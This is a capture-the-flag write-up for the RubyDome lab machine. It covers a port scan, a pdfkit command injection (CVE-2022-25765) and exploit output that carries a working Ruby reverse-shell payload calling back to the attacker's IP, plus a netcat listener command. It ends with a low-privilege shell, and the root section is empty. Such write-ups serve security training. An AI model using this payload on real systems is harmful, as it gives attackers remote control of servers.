# RubyDome
Proving Grounds Practice
Intermediate 


## Enumeration

## Possible Username Discovered
Sinatra -> Found this on robots.txt


### Target Scan 
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-title: RubyDome HTML to PDF
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



### SSH 22
Version - OpenSSH 8.9p1

### HTTP 3000
Version - WEBrick httpd 1.7.0
Header Info - WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
This webserver is vulnerabile to this attack, https://www.exploit-db.com/exploits/51293.

https://github.com/UNICORDev/exploit-CVE-2022-25765?tab=readme-ov-file


## Exploit
I discovered this exploit online, https://www.exploit-db.com/exploits/51293.
https://github.com/UNICORDev/exploit-CVE-2022-25765?tab=readme-ov-file

I ran the below command to get the ruby payload. Providing the port 4444, I setup a netcat listener and ran the next command which resulted in a reverse shell on the target machine. 

```
└─$ python3 exploit.py -s 192.168.45.188 4444
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.45.188","4444"))'`                                                                    
LOCALIP: 192.168.45.188:4444
WARNING: Be sure to start a local listener on the above IP and port.
EXPLOIT: Copy the payload above into a PDFKit.new().to_pdf Ruby function or any application running vulnerable pdfkit.                  
```


```
$ python3 exploit.py -s 192.168.45.188 4444 -w http://192.168.173.22:3000/pdf -p url

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Sent to Target Website Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.45.188","4444"))'`                                                                    
LOCALIP: 192.168.45.188:4444
WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 4444".
WEBSITE: http://192.168.173.22:3000/pdf
POSTARG: url
EXPLOIT: Payload sent to website!
SUCCESS: Exploit performed action.

```
### Local Flag


```
andrew@rubydome:~/app$ id
id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
andrew@rubydome:~/app$ cd ..
cd ..
andrew@rubydome:~$ ls
ls
app  local.txt
andrew@rubydome:~$ cat local.txt
```
### Root Flag




